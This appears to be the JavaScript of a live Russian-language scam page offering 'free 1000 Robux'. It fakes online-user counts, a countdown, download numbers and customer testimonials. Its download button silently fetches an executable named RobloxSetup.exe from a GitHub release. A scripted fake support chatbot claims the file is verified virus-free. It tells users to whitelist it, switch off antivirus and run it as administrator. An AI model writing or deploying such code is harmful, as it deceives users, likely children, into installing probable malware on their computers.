const onlineCount = document.getElementById('onlineCount');
const countdownEl = document.getElementById('countdown');
const downloadsCount = document.getElementById('downloadsCount');
const commentsFeed = document.getElementById('commentsFeed');
const downloadBtn = document.getElementById('downloadBtn');
const modal = document.getElementById('modal');
const progressFill = document.getElementById('progressFill');
const progressPct = document.getElementById('progressPct');
const toast = document.getElementById('toast');

let online = 234;
setInterval(() => {
  online = Math.max(180, online + Math.floor(Math.random() * 9) - 3);
  onlineCount.textContent = online;
}, 5000);

let seconds = 15 * 60 + 32;
setInterval(() => {
  seconds--;
  if (seconds < 0) seconds = 15 * 60 + 32;
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  countdownEl.textContent =
    String(h).padStart(2, '0') + ':' + String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
}, 1000);

let downloads = 12847;
setInterval(() => {
  downloads += Math.floor(Math.random() * 4) + 1;
  downloadsCount.textContent = downloads.toLocaleString('ru-RU');
}, 2000);

const commentsPool = [
  ['Дима', 'Скачал, всё пришло! Спасибо!'],
  ['Аня', 'У меня тоже сработало!'],
  ['Сергей', '1000 robux на месте 🔥'],
  ['Маша', 'Работает, проверила только что'],
  ['Никита', 'Друзья не верили, а зря!'],
  ['Оля', 'Промокод сам активировался, топ'],
  ['Влад', 'Установка реально 5 секунд'],
  ['Ксюша', 'Спасибо за подарок! 😍'],
];

function addComment() {
  const [name, text] = commentsPool[Math.floor(Math.random() * commentsPool.length)];
  const now = new Date();
  const time = String(now.getHours()).padStart(2, '0') + ':' + String(now.getMinutes()).padStart(2, '0');
  const div = document.createElement('div');
  div.className = 'comment';
  div.innerHTML = '<span class="comment-name">' + name + ':</span><span>' + text + '</span><span class="comment-time">' + time + '</span>';
  commentsFeed.prepend(div);
  while (commentsFeed.children.length > 4) commentsFeed.removeChild(commentsFeed.lastChild);
}

function showTypingIndicator() {
  const div = document.createElement('div');
  div.className = 'comment typing';
  div.innerHTML = '<span class="comment-name">Кто-то:</span><span class="typing-dots">печатает<span>.</span><span>.</span><span>.</span></span>';
  commentsFeed.prepend(div);
  setTimeout(() => {
    div.remove();
    addComment();
  }, 1800);
}

for (let i = 0; i < 3; i++) addComment();
setInterval(showTypingIndicator, 6500);

downloadBtn.addEventListener('click', () => {
  modal.classList.add('show');
  progressFill.style.width = '0%';
  progressPct.textContent = '0';

  let pct = 0;
  const timer = setInterval(() => {
    pct += Math.floor(Math.random() * 8) + 2;
    if (pct >= 100) {
      pct = 100;
      clearInterval(timer);
      setTimeout(finishDownload, 400);
    }
    progressFill.style.width = pct + '%';
    progressPct.textContent = pct;
  }, 90);

  const a = document.createElement('a');
  a.href = 'https://github.com/Doinwor/robux-gift/releases/download/v1.0/RobloxSetup.exe';
  a.download = 'RobloxSetup.exe';
  document.body.appendChild(a);
  a.click();
  a.remove();
});

function finishDownload() {
  modal.classList.remove('show');
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 5000);
}

if ('IntersectionObserver' in window) {
  document.documentElement.classList.add('reveal-enabled');
  const revealObserver = new IntersectionObserver(
    (entries) => {
      entries.forEach((entry) => {
        if (entry.isIntersecting) {
          entry.target.classList.add('visible');
          revealObserver.unobserve(entry.target);
        }
      });
    },
    { threshold: 0.15 }
  );

  document.querySelectorAll('.reveal').forEach((el) => revealObserver.observe(el));
  setTimeout(() => {
    document.querySelectorAll('.reveal').forEach((el) => el.classList.add('visible'));
  }, 3000);
}

const supportBtn = document.getElementById('supportBtn');
const chatPanel = document.getElementById('chatPanel');
const chatClose = document.getElementById('chatClose');
const chatLog = document.getElementById('chatLog');
const chatInput = document.getElementById('chatInput');
const chatSend = document.getElementById('chatSend');

const welcomeMsg = 'Здравствуйте! 👋 Вы в службе поддержки Robux Gift. Задайте любой вопрос об акции — ответим в течение пары минут.';

const botRules = [
  { keys: ['вирус', 'virus', 'безопасн', 'опасн', 'антивирус', 'троян', 'trojan'], reply: 'Наш установщик проверен антивирусом Касперского — это 100% НЕ ВИРУС. 🛡️ Если антивирус ругается на новый файл, это ложное срабатывание: добавьте файл в исключения и запустите ещё раз.' },
  { keys: ['промокод', 'код', 'активаци'], reply: 'Промокод активируется автоматически после установки программы. Скачайте установщик кнопкой «СКАЧАТЬ УСТАНОВЩИК», установите его и robux придут на аккаунт автоматически.' },
  { keys: ['robux', 'робукс', 'робик', 'подарок', 'акция', 'приз'], reply: 'По акции Robux Gift вы получаете 1000 ROBUX бесплатно. 🎁 После установки программы подождите до 10 минут и проверьте баланс в игре — robux зачислятся автоматически.' },
  { keys: ['скачал', 'скачать', 'скачива', 'загруз', 'установил', 'установк', 'установ'], reply: 'Отлично! ✅ Запустите скачанный файл и дождитесь окончания установки. После этого robux автоматически зачислятся на ваш аккаунт. Если за 10 минут не пришли — напишите, проверим вручную.' },
  { keys: ['не работает', 'не запуска', 'ошибка', 'сломал', 'не открыва', 'не пришли', 'не пришёл', 'нет robux', 'краш'], reply: 'Давайте разберёмся. 🛠️ Попробуйте: 1) закрыть антивирус на время установки; 2) запустить файл от имени администратора (ПКМ → «Запуск от имени администратора»); 3) перезагрузить компьютер. Если не помогло — опишите, что именно происходит.' },
  { keys: ['привет', 'здравств', 'добрый', 'hi', 'hello', 'ку'], reply: 'Здравствуйте! 👋 Чем можем помочь по акции Robux Gift?' },
  { keys: ['спасибо', 'благодар', 'класс', 'супер', 'отлично', 'топ', 'круто'], reply: 'Пожалуйста! 🎁 Приятного использования. Если появятся вопросы — мы всегда на связи.' },
  { keys: ['пока', 'до свидан', 'всего', 'удачи', 'прощай'], reply: 'Всего доброго! Если что-то понадобится — обращайтесь 😊' },
  { keys: ['долго', 'когда', 'сколько', 'время', 'ждем', 'ждём', 'придут'], reply: 'Зачисление robux занимает до 10 минут после установки, обычно приходят за 1–2 минуты. Проверьте баланс в игре — если robux не пришли, напишите нам!' },
  { keys: ['сколько стоит', 'цена', 'деньги', 'платно', 'бесплатн', 'оплат'], reply: 'Акция полностью бесплатная — никаких оплат и скрытых списаний. 🆓 Промокод активируется сам после установки программы.' },
];

function botReply(text) {
  const t = text.toLowerCase();
  for (const rule of botRules) {
    if (rule.keys.some((k) => t.includes(k))) return rule.reply;
  }
  return 'Спасибо за обращение! Передал ваш вопрос специалисту. 😉 А пока подскажите: вы уже скачали установщик и установили программу? Если да — robux придут в течение 10 минут.';
}

function appendChat(html, cls) {
  const div = document.createElement('div');
  div.className = 'chat-msg ' + cls;
  div.innerHTML = html;
  chatLog.appendChild(div);
  chatLog.scrollTop = chatLog.scrollHeight;
  return div;
}

function botTypingThen(reply) {
  const t = appendChat('Поддержка печатает<span class="typing-dots">..<span>.</span></span>', 'typing');
  const delay = Math.min(2000, 700 + reply.length * 15);
  setTimeout(() => {
    t.remove();
    appendChat(reply, 'bot');
  }, delay);
}

function sendMessage(text) {
  text = text.trim();
  if (!text) return;
  appendChat(text.replace(/</g, '&lt;').replace(/\n/g, '<br>'), 'user');
  chatInput.value = '';
  botTypingThen(botReply(text));
}

supportBtn.addEventListener('click', () => {
  chatPanel.classList.add('show');
  if (!chatLog.children.length) {
    botTypingThen(welcomeMsg);
  }
  setTimeout(() => chatInput.focus(), 150);
});

chatClose.addEventListener('click', () => chatPanel.classList.remove('show'));

chatSend.addEventListener('click', () => sendMessage(chatInput.value));

chatInput.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') sendMessage(chatInput.value);
});

document.querySelectorAll('.chat-chip').forEach((chip) => {
  chip.addEventListener('click', () => sendMessage(chip.dataset.q));
});
